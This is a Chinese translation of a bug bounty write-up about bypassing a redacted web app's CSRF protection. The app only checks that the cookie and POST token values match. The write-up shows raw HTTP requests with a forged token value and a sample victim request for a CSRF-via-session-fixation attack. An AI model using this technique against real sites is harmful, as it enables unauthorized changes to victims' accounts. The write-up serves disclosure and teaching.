# Bug Bounty:让我们绕过整个网络应用的 CSRF 保护

> 原文：<https://infosecwriteups.com/bug-bounty-lets-bypass-an-entire-web-app-s-csrf-protection-friend-link-b69c43e9dcf7?source=collection_archive---------2----------------------->

## CSRF 令牌并不总是足够的

![](img/1cbfb74e01aae6091cb1af188a796bc7.png)

照片由[迈克尔·泽兹奇](https://unsplash.com/@lazycreekimages?utm_source=medium&utm_medium=referral)在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄

大家好，

我希望你这段时间过得很好。我决定写一些有趣的 bug bounty 文章来帮助新手找到他们的第一个 bug。

今天我想谈谈我在一个私人的臭虫奖励项目中发现的一个臭虫。它包括绕过公司 Web 应用程序的整个 csrf 保护系统。

因为这是一个私人的臭虫奖励计划，让我们假设我们的目标是 https://redacted.com。

现在，当我编辑我的账户设置时，我总是寻找 CSRF。保存我的帐户设置时，我会收到这样的请求:

```
POST /User/Edit?status=success HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Origin: https://redacted.com
Connection: close
Referer: https://redacted.com/User/Edit?status=success
Cookie: Cookie: _ga=value; _gid=value; _fbp=value; _hjid=value; session=value; countryCode=value; regionCode=04; current_page=%2FUser%2FEdit%3Fstatus%3Dsuccess; banner-covid19-dismissed=1; last_page=%2FUser%2FEdit; csrf=1j2wjowidwdne; _uetsid=value; _uetvid=value
Upgrade-Insecure-Requests: 1originalEditLogin=email@email.com&originalEditUsername=Test+Pentester+CSRF&userid=userid&avatarImageID=&uniqueUsername=testpentester&editUsername=Test+Pentester+CSRF+test&Ecom_BillTo_Online_Email_Login_Edit=email@email.com&editPassword=&editPassword2=&latitude=&longitude=&csrf=1j2wjowidwdne
```

目前看来一切正常，但是试着看看饼干。你会注意到那里有一个`csrf`值；最重要的是，它在 POST 数据中具有与 csrf 令牌相同的值。听起来不错…

为什么 cookie 中有 POST 数据的重复 csrf 令牌？如果令牌是在服务器端验证的，这就没有意义了。但是如果令牌是在客户端验证的呢？

我尝试用另一个令牌值(比如说`customtoken123`)来更改 cookie 和 post 数据参数中的 csrf 值。请求看起来像这样:

```
POST /User/Edit?status=success HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Origin: https://redacted.com
Connection: close
Referer: https://redacted.com/User/Edit?status=success
Cookie: Cookie: _ga=value; _gid=value; _fbp=value; _hjid=value; session=value; countryCode=value; regionCode=04; current_page=%2FUser%2FEdit%3Fstatus%3Dsuccess; banner-covid19-dismissed=1; last_page=%2FUser%2FEdit; csrf=customtoken123; _uetsid=value; _uetvid=value
Upgrade-Insecure-Requests: 1originalEditLogin=email@email.com&originalEditUsername=Test+Pentester+CSRF&userid=userid&avatarImageID=&uniqueUsername=testpentester&editUsername=Test+Pentester+CSRF+test&Ecom_BillTo_Online_Email_Login_Edit=email@email.com&editPassword=&editPassword2=&latitude=&longitude=&csrf=customtoken123
```

并且，当我转发这个的时候，得到了成功的回复，哇！

这是因为，应用程序检查 POST 数据和 cookie 中的令牌是否具有相同的值。因此，令牌没有经过服务器端验证。这种特殊的 CSRF 攻击通过会话固定被命名为 CSRF。这个名字是由于利用它的方式:您首先使用会话固定攻击将 cookie 值中的`csrf`令牌更改为例如`tok_1234`，然后让受害者执行如下 POST 请求:

```
POST / HTTP/1.1originalEditLogin=email@email.com&originalEditUsername=Test+Pentester+CSRF&userid=userid&avatarImageID=&uniqueUsername=testpentester&editUsername=Test+Pentester+CSRF+test&Ecom_BillTo_Online_Email_Login_Edit=email@email.com&editPassword=&editPassword2=&latitude=&longitude=&csrf=tok_1234
```

# 外卖食品

*   如果有 csrf 保护，并不意味着 webapp 不容易受到 csrf 的攻击
*   寻找 csrf 时，请务必查看 cookies

希望你喜欢这篇文章，并继续关注更多有趣的 BugBounty 技巧和文章。